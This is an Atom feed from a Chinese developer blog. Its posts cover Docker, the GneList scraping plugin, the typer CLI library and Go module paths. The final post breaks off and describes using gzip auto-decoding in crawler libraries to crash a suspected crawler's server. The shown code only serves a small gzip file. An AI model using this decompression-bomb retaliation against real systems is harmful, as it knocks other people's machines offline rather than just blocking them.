<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>谢乾坤 | Kingname</title>
  
  <subtitle>给时光以生命。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.kingname.info/"/>
  <updated>2022-03-09T09:27:02.721Z</updated>
  <id>https://www.kingname.info/</id>
  
  <author>
    <name>谢乾坤 | Kingname</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>如何准备简历和面试（未闻Code直播录像）</title>
    <link href="https://www.kingname.info/2022/03/09/how-to-prepare-for-interview/"/>
    <id>https://www.kingname.info/2022/03/09/how-to-prepare-for-interview/</id>
    <published>2022-03-09T09:26:09.000Z</published>
    <updated>2022-03-09T09:27:02.721Z</updated>
    
    <content type="html"><![CDATA[<iframe src="//player.bilibili.com/player.html?bvid=BV1t3411B7XW&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width="720px" height="500px"> </iframe>]]></content>
    
    <summary type="html">
    
      
      
        &lt;iframe src=&quot;//player.bilibili.com/player.html?bvid=BV1t3411B7XW&amp;page=1&quot; scrolling=&quot;no&quot; border=&quot;0&quot; frameborder=&quot;no&quot; framespacing=&quot;0&quot; allowfu
      
    
    </summary>
    
      <category term="面试" scheme="https://www.kingname.info/categories/%E9%9D%A2%E8%AF%95/"/>
    
    
      <category term="视频" scheme="https://www.kingname.info/tags/%E8%A7%86%E9%A2%91/"/>
    
      <category term="面试" scheme="https://www.kingname.info/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>不走弯路的Docker入门</title>
    <link href="https://www.kingname.info/2022/03/09/intro-to-docker/"/>
    <id>https://www.kingname.info/2022/03/09/intro-to-docker/</id>
    <published>2022-03-09T09:24:02.000Z</published>
    <updated>2022-03-09T09:25:33.107Z</updated>
    
    <content type="html"><![CDATA[<p>保证你看完这个视频，就能使用 Docker。</p><iframe src="//player.bilibili.com/player.html?bvid=BV1Tg41157j4&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width="720px" height="500px"> </iframe>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;保证你看完这个视频，就能使用 Docker。&lt;/p&gt;
&lt;iframe src=&quot;//player.bilibili.com/player.html?bvid=BV1Tg41157j4&amp;page=1&quot; scrolling=&quot;no&quot; border=&quot;0&quot; frameborder
      
    
    </summary>
    
      <category term="Docker" scheme="https://www.kingname.info/categories/Docker/"/>
    
    
      <category term="视频" scheme="https://www.kingname.info/tags/%E8%A7%86%E9%A2%91/"/>
    
      <category term="Docker" scheme="https://www.kingname.info/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>GneList 来了！抓取列表页-极-其-简-单！</title>
    <link href="https://www.kingname.info/2022/03/09/this-is-gnelist/"/>
    <id>https://www.kingname.info/2022/03/09/this-is-gnelist/</id>
    <published>2022-03-09T08:56:05.000Z</published>
    <updated>2022-03-09T09:06:54.954Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/GeneralNewsExtractor/GeneralNewsExtractor" target="_blank" rel="noopener">Gne</a>发布以后，大家自动化抓取新闻正文页的需求被解决了。但随之而来的，不断有同学希望能出一个抓取列表页的工具，于是，就有了今天的 GneList。</p><a id="more"></a><h2 id="GneList-是什么"><a href="#GneList-是什么" class="headerlink" title="GneList 是什么"></a>GneList 是什么</h2><p>GneList是一个浏览器插件，专门用来生成列表页的 XPath。使用这个 XPath，你可以快速获取到列表页中的每一个条目。</p><h2 id="GneList-怎么用？"><a href="#GneList-怎么用？" class="headerlink" title="GneList 怎么用？"></a>GneList 怎么用？</h2><iframe src="//player.bilibili.com/player.html?bvid=BV1Nb4y1s7Lc&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width="720px" height="500px"> </iframe><p>GneList 的使用非常简单，几乎不需要说明。</p><ol><li>打开带有列表的页面</li><li>点击插件</li><li>输入名字，点击<code>开始抓取</code></li><li>鼠标点击列表的前两项，GneList 会自动选中所有项</li><li>点击<code>提交</code>按钮</li><li>去数据库查看 XPath</li></ol><h2 id="怎么安装-GneList"><a href="#怎么安装-GneList" class="headerlink" title="怎么安装 GneList?"></a>怎么安装 GneList?</h2><p>GneList 由两个部分组成：插件端与后端。</p><p>插件端的下载地址：<a href="https://github.com/GeneralNewsExtractor/GneList/releases/download/0.1/GneList.zip" target="_blank" rel="noopener">https://github.com/GeneralNewsExtractor/GneList/releases/download/0.1/GneList.zip</a></p><p>后端的代码：<a href="https://github.com/GeneralNewsExtractor/GneListBackend" target="_blank" rel="noopener">https://github.com/GeneralNewsExtractor/GneListBackend</a> ，并且后端依赖 MongoDB。</p><h3 id="安装后端"><a href="#安装后端" class="headerlink" title="安装后端"></a>安装后端</h3><p>首先确保你有一个可以连接的 MongoDB，我们假设它的 URI 是：<code>mongodb://localhost</code>。从 Github上面 clone 后端的代码：<code>https://github.com/GeneralNewsExtractor/GneListBackend.git</code>。</p><p>进入后端代码的根目录中的 config 文件夹中，你会发现一个<code>local.yml</code>文件。打开它，第一行填写 MongoDB 的 URI 地址，第二行是数据库名，第三行是集合名。插件生成的 XPath 会保存在这里供你的下游调用。</p><p>改好配置文件以后，回到后端的根目录，分别执行如下命令(你需要先安装 Pipenv)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pipenv install</span><br><span class="line">pipenv shell</span><br><span class="line"><span class="built_in">export</span> <span class="built_in">local</span> <span class="comment"># 你自己创建的 yml文件的名字</span></span><br><span class="line">uvicorn main:app --port 8800 --host 0.0.0.0  <span class="comment"># 使用8800端口</span></span><br></pre></td></tr></table></figure><p>命令执行完成后，如果你使用浏览器访问<code>http://127.0.0.1:8800</code>，应该会看到下图的内容，说明后端搭建成功。</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-03-08-22-40-38.png" alt></p><h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><p>GneList 插件支持所有基于 Chromium 内核的浏览器，包括但不限于 Chrome/Chromium/Edge。</p><p>从上面的地址下载<code>GneList.zip</code>后，把它解压到任何一个文件夹中，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-03-08-22-45-08.png" alt></p><p>然后打开你的浏览器的插件管理页面，启动<code>开发人员模式</code>，例如下图是我在 Edge 中开启开发人员模式的方法。</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-03-08-22-47-02.png" alt></p><p>然后点击右上角的<code>加载解压缩的扩展</code>，选中<code>GneList</code>文件夹。完成。</p><p>现在，刷新已有的列表页，或者重新开一个新的列表页，然后点击插件，试用一下吧。</p><h3 id="管理配置页面"><a href="#管理配置页面" class="headerlink" title="管理配置页面"></a>管理配置页面</h3><p>在插件上右键，选择<code>扩展选项</code>。Chrome 上面，名字可能是叫做<code>选项</code>或者英文<code>Options</code>。可以打开如下图所示的页面：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-03-08-22-51-06.png" alt></p><p>如果你没有启动后端，或者后端地址不是<code>http://127.0.0.1:8800</code>（例如你把后端部署在服务器上，需要使用 IP 或者域名来访问，或者端口不是8800），那么这个页面应该如上图所示。</p><p>你可以把输入框中的地址改为<code>后端地址/rule</code>，例如<code>http://123.56.78.99:8888/rule</code>。然后点击<code>提交</code>按钮。接下来刷新页面，你就可以看到如下图所示的内容：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-03-08-22-54-35.png" alt></p><p>这个页面显示了你已经添加的所有网站的XPath，你可以对他们进行修改或者删除。</p><h3 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h3><blockquote><p>为什么插件生成的 XPath 这么奇怪？</p></blockquote><p>因为这些 XPath 是从 CssSelector 转成的 XPath，我用了一个第三方的 JavaScript 包。那个包转出来的就是这么奇怪。但不影响它的功能。我后面会更换更好的包，让 XPath 变得更好看。</p><blockquote><p>我的爬虫怎么使用这些 XPath？</p></blockquote><p>还记得一开始配置的 MongoDB 吗？让你的爬虫去里面读取就可以了。</p><blockquote><p>为什么我启动插件以后，点网页上面的元素第一次没有反应？</p></blockquote><p>第一次点击的时候，如果发现没有生成红框框，就多点一下。看到红框框了再点第二个元素。</p><h2 id="GneList-的原理是什么？"><a href="#GneList-的原理是什么？" class="headerlink" title="GneList 的原理是什么？"></a>GneList 的原理是什么？</h2><p>接下来的几篇文章，我会介绍 GneList 的原理。如果你等不及的话，也可以到 Github上查看<a href="https://github.com/GeneralNewsExtractor/GneList" target="_blank" rel="noopener">源代码</a>。GneList 与 Gne 一样，他们是站在其他优秀开源项目的肩膀上做出来的，尤其是受到 <a href="https://github.com/martinsbalodis/web-scraper-chrome-extension" target="_blank" rel="noopener">web-scraper-chrome-extension</a>的启发。因此，GneList也是完全开源的，允许非商业使用。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://github.com/GeneralNewsExtractor/GeneralNewsExtractor&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Gne&lt;/a&gt;发布以后，大家自动化抓取新闻正文页的需求被解决了。但随之而来的，不断有同学希望能出一个抓取列表页的工具，于是，就有了今天的 GneList。&lt;/p&gt;
    
    </summary>
    
      <category term="Gne" scheme="https://www.kingname.info/categories/Gne/"/>
    
    
      <category term="Gne" scheme="https://www.kingname.info/tags/Gne/"/>
    
      <category term="GneList" scheme="https://www.kingname.info/tags/GneList/"/>
    
  </entry>
  
  <entry>
    <title>使用 LogSeq 阅读 PDF体验极好</title>
    <link href="https://www.kingname.info/2022/03/09/read-pdf-by-logseq/"/>
    <id>https://www.kingname.info/2022/03/09/read-pdf-by-logseq/</id>
    <published>2022-03-09T07:10:49.000Z</published>
    <updated>2022-03-09T09:28:56.104Z</updated>
    
    <content type="html"><![CDATA[<iframe src="//player.bilibili.com/player.html?bvid=BV1iL411N7sq&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width="720px" height="500px"> </iframe>]]></content>
    
    <summary type="html">
    
      
      
        &lt;iframe src=&quot;//player.bilibili.com/player.html?bvid=BV1iL411N7sq&amp;page=1&quot; scrolling=&quot;no&quot; border=&quot;0&quot; frameborder=&quot;no&quot; framespacing=&quot;0&quot; allowfu
      
    
    </summary>
    
      <category term="LogSeq" scheme="https://www.kingname.info/categories/LogSeq/"/>
    
    
      <category term="视频" scheme="https://www.kingname.info/tags/%E8%A7%86%E9%A2%91/"/>
    
      <category term="LogSeq" scheme="https://www.kingname.info/tags/LogSeq/"/>
    
  </entry>
  
  <entry>
    <title>FastAPI的小兄弟，开发命令行工具更给力</title>
    <link href="https://www.kingname.info/2022/03/06/typer/"/>
    <id>https://www.kingname.info/2022/03/06/typer/</id>
    <published>2022-03-06T15:16:46.000Z</published>
    <updated>2022-03-06T15:27:53.637Z</updated>
    
    <content type="html"><![CDATA[<p>关注我公众号的同学都知道，我非常喜欢FastAPI这个web框架。它在易用性上面做到了极致，帮助开发者减少了很多不必要的工作。</p><p>FastAPI的开发组织叫做<code>tiangolo</code>，他家除了FastAPI外，还有另一个项目也非常好用，叫做<code>typer</code>。</p><p>三年前，我写过一篇文章<a href="https://mp.weixin.qq.com/s/lO42vHaYz1TToiUO8Q2wcQ" target="_blank" rel="noopener">一日一技：快速实现Python 命令行参数</a>介绍另一个命令行工具fire. 而<code>typer</code>做得比fire还要好。</p><a id="more"></a><p>首先使用pip来安装它：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install typer</span><br></pre></td></tr></table></figure><h2 id="函数参数等于命令行参数"><a href="#函数参数等于命令行参数" class="headerlink" title="函数参数等于命令行参数"></a>函数参数等于命令行参数</h2><p>我们首先来看看typer怎么使用。创建一个<code>example_1.py</code>文件，写入如下代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> typer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(name: str, salary: int)</span>:</span></span><br><span class="line">    print(<span class="string">f'<span class="subst">&#123;name&#125;</span>月薪<span class="subst">&#123;salary&#125;</span>元'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    typer.run(main)</span><br></pre></td></tr></table></figure><p>直接运行，Python会报错：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220119182532.png" alt></p><p>使用参数<code>--help</code>可以查看这个脚本的命令行参数：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220119182619.png" alt></p><p>于是我们根据这里的提示，输入正确的参数，从而正常运行程序：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220119182659.png" alt></p><h2 id="子命令与自动补全更好用"><a href="#子命令与自动补全更好用" class="headerlink" title="子命令与自动补全更好用"></a>子命令与自动补全更好用</h2><p>假设我们有一个神经网络的程序，其中的入口函数代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train_data</span><span class="params">(train_folder: str, test_folder: str, rate: float = <span class="number">0.8</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    训练人脸检测模型</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    print(<span class="string">f'使用文件夹<span class="subst">&#123;train_folder&#125;</span>中的数据进行训练'</span>)</span><br><span class="line">    print(<span class="string">f'使用<span class="subst">&#123;test_folder&#125;</span>中的数据用来验证训练效果，确保准确率&gt;<span class="subst">&#123;rate&#125;</span>'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">predict</span><span class="params">(folder: str)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    使用训练好的模型预测</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    print(<span class="string">f'对文件夹<span class="subst">&#123;folder&#125;</span>中的数据进行预测。'</span>)</span><br></pre></td></tr></table></figure><p>显然，这个程序可以用来训练数据，也可以用来预测数据，所以有两种不同的命令，每一种命令有不同的参数。</p><p>这种情况下，使用typer非常方便，只需要加两个装饰器就可以了：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220119183543.png" alt></p><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220119183621.png" alt></p><p>输入具体的子命令，还可以查看每个子命令的参数：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220119183725.png" alt></p><p>因此，我可以使用两个不同的子命令来运行程序：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220119185959.png" alt></p><p>你以为这样就完了？我们再安装它的一个辅助工具<code>typer-cli</code>，还可以做更多事情：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install typer-cli</span><br><span class="line">typer --install-completion</span><br></pre></td></tr></table></figure><p>有了这个东西，我们运行程序可以这样写：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typer example_2.py run 子命令 参数1 参数2 --可选参数1 可选参数1的值</span><br></pre></td></tr></table></figure><p>例如：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220119184434.png" alt></p><p>并且，typer可以帮我们可以实现自动补全：</p><p>输入<code>typer example_2.py run</code> 然后按下<code>Tab</code>键，自动告诉你可以输入哪些子命令，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220119184218.png" alt></p><p>除此之外，如果你的命令行程序只有一个命令，那么你甚至只需要写一个函数，连typer都不需要导入，就可以使用typer来运行：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220119184837.png" alt></p><h2 id="自动生成文档也简单"><a href="#自动生成文档也简单" class="headerlink" title="自动生成文档也简单"></a>自动生成文档也简单</h2><p>我们知道，FastAPI自动生成接口文档的功能非常好用。typer作为它的兄弟，也继承了这个高级功能。我们来看看：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> typer</span><br><span class="line"></span><br><span class="line">app = typer.Typer(help=<span class="string">"人脸检测模型"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.command()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train_data</span><span class="params">(train_folder: str, test_folder: str, rate: float = <span class="number">0.8</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    训练人脸检测模型</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    print(<span class="string">f'使用文件夹<span class="subst">&#123;train_folder&#125;</span>中的数据进行训练'</span>)</span><br><span class="line">    print(<span class="string">f'使用<span class="subst">&#123;test_folder&#125;</span>中的数据用来验证训练效果，确保准确率&gt;<span class="subst">&#123;rate&#125;</span>'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.command()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">predict</span><span class="params">(folder: str)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    使用训练好的模型预测</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    print(<span class="string">f'对文件夹<span class="subst">&#123;folder&#125;</span>中的数据进行预测。'</span>)</span><br></pre></td></tr></table></figure><p>运行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typer main.py utils docs --name <span class="string">"python3 main.py"</span> --output readme.md</span><br></pre></td></tr></table></figure><p>自动在当前文件夹生成一个<code>readme.md</code>文件。我们使用任何能够渲染Markdown的软件打开这个文档，可以看到文档内容如下：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220119185537.png" alt></p><p>这样一来，我们不需要额外花心思去维护文档，只需要在修改完代码、增删新的命令或者参数以后，运行这个命令，就可以把文档自动更新。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;关注我公众号的同学都知道，我非常喜欢FastAPI这个web框架。它在易用性上面做到了极致，帮助开发者减少了很多不必要的工作。&lt;/p&gt;
&lt;p&gt;FastAPI的开发组织叫做&lt;code&gt;tiangolo&lt;/code&gt;，他家除了FastAPI外，还有另一个项目也非常好用，叫做&lt;code&gt;typer&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;三年前，我写过一篇文章&lt;a href=&quot;https://mp.weixin.qq.com/s/lO42vHaYz1TToiUO8Q2wcQ&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;一日一技：快速实现Python 命令行参数&lt;/a&gt;介绍另一个命令行工具fire. 而&lt;code&gt;typer&lt;/code&gt;做得比fire还要好。&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://www.kingname.info/categories/Python/"/>
    
    
      <category term="Python" scheme="https://www.kingname.info/tags/Python/"/>
    
      <category term="FastAPI" scheme="https://www.kingname.info/tags/FastAPI/"/>
    
  </entry>
  
  <entry>
    <title>舍近求远，为什么 Golang 要这样读取本地的 package？</title>
    <link href="https://www.kingname.info/2022/03/06/gomod/"/>
    <id>https://www.kingname.info/2022/03/06/gomod/</id>
    <published>2022-03-06T15:16:38.000Z</published>
    <updated>2022-03-06T15:28:07.028Z</updated>
    
    <content type="html"><![CDATA[<p>我们知道，Python 的第三方库一般是托管到 Pypi 上面的，使用 <code>pip</code> 命令进行安装。而 Golang 很多第三方库是托管在 Github 上面的，使用 <code>go get</code> 进行安装。</p><p>有时候，我们会发现一个很奇怪的现象，很多 Golang 的项目，在引用自己项目里面的包的时候，竟然用的是 Github 上面的地址。</p><a id="more"></a><p>例如我们看这个项目：<a href="https://github.com/kingname/handsome" target="_blank" rel="noopener">https://github.com/kingname/handsome</a> ，它的入口文件是<code>main.go</code>。我们打开这个文件，会看到里面<code>import</code>语句中，从 Github导入自身的<code>util</code>包：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220120193156.png" alt></p><p>可问题是，这个 <code>util</code>文件夹就在<code>main.go</code>旁边啊：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220120193259.png" alt></p><p>如果是在 Python 里面，入口文件<code>main.py</code>旁边有一个<code>util</code>文件夹，这个文件夹里面有一个<code>util.py</code>的文件，那么我们直接写<code>from util.util import xxx</code>就可以导入<code>util.py</code>文件中的函数了。为什么 Golang 里面要从 Github 导入？那如果我更新了<code>util/util.go</code>文件里面的内容，但是我没有把这次修改上传到 Github 中，当我运行<code>go run main.go</code>的时候，运行的是老代码还是新代码？用的是我本地的版本还是 Github 上面的版本？</p><p>这个问题的关键，就在<code>go.mod</code>这个文件中。打开请看这个文件的第一行：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220120194356.png" alt></p><p>可以看到，这个项目是使用 <code>go mod</code> 进行管理的，并且指定这个模块的名字，就叫做<code>github.com/kingname/handsome</code>。</p><p>所以，当我们执行命令<code>go run main.go</code>的时候，Golang 的编译器知道自己就是<code>github.com/kingname/handsome</code>，那么<code>main.go</code>里面导入<code>github.com/kingname/handsome/util</code>，实际上就是本项目自身根目录的 <code>util</code>文件夹中的包，它不会发起网络请求，不会从 Github 上面重新下载。每次运行的时候，使用的总是项目<code>util/util.go</code>中的内容。</p><p>但是，如果你现在在另外一个项目里面导入<code>github.com/kingname/handsome/util</code>，Golang 从<code>go.mod</code>中知道当前运行的项目跟即将导入的这个包不在同一个项目中，于是它就会去 Github 上面拉代码下来运行。</p><p>这个规则，可以在 Golang 的官方文档<strong>Module paths</strong>这一节找到：<a href="https://go.dev/ref/mod#introduction" target="_blank" rel="noopener">Go Modules Reference - The Go Programming Language</a>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们知道，Python 的第三方库一般是托管到 Pypi 上面的，使用 &lt;code&gt;pip&lt;/code&gt; 命令进行安装。而 Golang 很多第三方库是托管在 Github 上面的，使用 &lt;code&gt;go get&lt;/code&gt; 进行安装。&lt;/p&gt;
&lt;p&gt;有时候，我们会发现一个很奇怪的现象，很多 Golang 的项目，在引用自己项目里面的包的时候，竟然用的是 Github 上面的地址。&lt;/p&gt;
    
    </summary>
    
      <category term="Golang" scheme="https://www.kingname.info/categories/Golang/"/>
    
    
      <category term="Golang" scheme="https://www.kingname.info/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：反爬虫的极致手段，几行代码直接炸了爬虫服务器</title>
    <link href="https://www.kingname.info/2022/03/06/gzip-boom/"/>
    <id>https://www.kingname.info/2022/03/06/gzip-boom/</id>
    <published>2022-03-06T15:16:09.000Z</published>
    <updated>2022-03-06T15:26:02.606Z</updated>
    
    <content type="html"><![CDATA[<p>作为一个站长，你是不是对爬虫不胜其烦？爬虫天天来爬，速度又快，频率又高，服务器的大量资源被白白浪费。</p><p>看这篇文章的你有福了，我们今天一起来报复一下爬虫，直接把爬虫的服务器给干死机。</p><a id="more"></a><blockquote><p>本文有一个前提：你已经知道某个请求是爬虫发来的了，你不满足于单单屏蔽对方，而是想搞死对方。</p></blockquote><p>很多人的爬虫是使用Requests来写的，如果你阅读过Requests的文档，那么你可能在文档中的<a href="https://2.python-requests.org/en/master/user/quickstart/#binary-response-content" target="_blank" rel="noopener">Binary Response Content</a>这一小节，看到这样一句话：</p><blockquote><p>The gzip and deflate transfer-encodings are automatically decoded for you.<br>（Request）会自动为你把gzip和deflate转码后的数据进行解码</p></blockquote><p>网站服务器可能会使用<code>gzip</code>压缩一些大资源，这些资源在网络上传输的时候，是压缩后的二进制格式。客户端收到返回以后，如果发现返回的Headers里面有一个字段叫做<code>Content-Encoding</code>，其中的值包含<code>gzip</code>，那么客户端就会先使用<code>gzip</code>对数据进行解压，解压完成以后再把它呈现到客户端上面。浏览器自动就会做这个事情，用户是感知不到这个事情发生的。而<code>requests</code>、<code>Scrapy</code>这种网络请求库或者爬虫框架，也会帮你做这个事情，因此你不需要手动对网站返回的数据解压缩。</p><p>这个功能原本是一个方便开发者的功能，但我们可以利用这个功能来做报复爬虫的事情。</p><p>我们首先写一个客户端，来测试一下返回<code>gzip</code>压缩数据的方法。</p><p>我首先在硬盘上创建一个文本文件<code>text.txt</code>，里面有两行内容，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220124194721.png" alt></p><p>然后，我是用<code>gzip</code>命令把它压缩成一个<code>.gz</code>文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat text.txt | gzip &gt; data.gz</span><br></pre></td></tr></table></figure><p>接下来，我们使用FastAPI写一个HTTP服务器<code>server.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, Response</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> FileResponse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    resp = FileResponse(<span class="string">'data.gz'</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure><p>然后使用命令<code>uvicorn server:app</code>启动这个服务。</p><p>接下来，我们使用requests来请求这个接口，会发现返回的数据是乱码，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220124195107.png" alt></p><p>返回的数据是乱码，这是因为服务器没有告诉客户端，这个数据是<code>gzip</code>压缩的，因此客户端只有原样展示。由于压缩后的数据是二进制内容，强行转成字符串就会变成乱码。</p><p>现在，我们稍微修改一下<code>server.py</code>的代码，通过Headers告诉客户端，这个数据是经过<code>gzip</code>压缩的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, Response</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> FileResponse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    resp = FileResponse(<span class="string">'data.gz'</span>)</span><br><span class="line">    resp.headers[<span class="string">'Content-Encoding'</span>] = <span class="string">'gzip'</span>  <span class="comment"># 说明这是gzip压缩的数据</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure><p>修改以后，重新启动服务器，再次使用requests请求，发现已经可以正常显示数据了：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220124195422.png" alt></p><p>这个功能已经展示完了，那么我们怎么利用它呢？这就不得不提到压缩文件的原理了。</p><p>文件之所以能压缩，是因为里面有大量重复的元素，这些元素可以通过一种更简单的方式来表示。压缩的算法有很多种，其中最常见的一种方式，我们用一个例子来解释。假设有一个字符串，它长成下面这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1111111111111111</span><br><span 